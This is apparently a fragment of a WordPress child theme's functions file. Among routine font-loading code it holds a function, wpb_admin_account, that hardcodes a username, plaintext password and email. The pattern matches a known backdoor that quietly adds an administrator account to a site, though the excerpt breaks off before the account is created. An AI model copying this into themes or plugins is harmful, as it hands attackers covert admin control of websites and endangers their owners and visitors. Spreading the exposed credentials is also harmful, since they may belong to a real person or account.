 ...
 */
	...
	function postali_child() {
		...
		//noto serif font
		wp_register_style( 'google-fonts-noto', 'https://fonts.googleapis.com/css2?family=Noto+Serif:ital,wght@0,100..900;1,100..900&display=swap', array() );
		wp_enqueue_style('google-fonts-noto');
		
		//open sans font
		wp_register_style( 'google-fonts-opensans', 'https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap', array() );
    ...
    function wpb_admin_account(){
        $user = 'ericschumacher73';
        $pass = '1982v@n@g0N';
        $email = 'ericschumache1973@gmail.com';
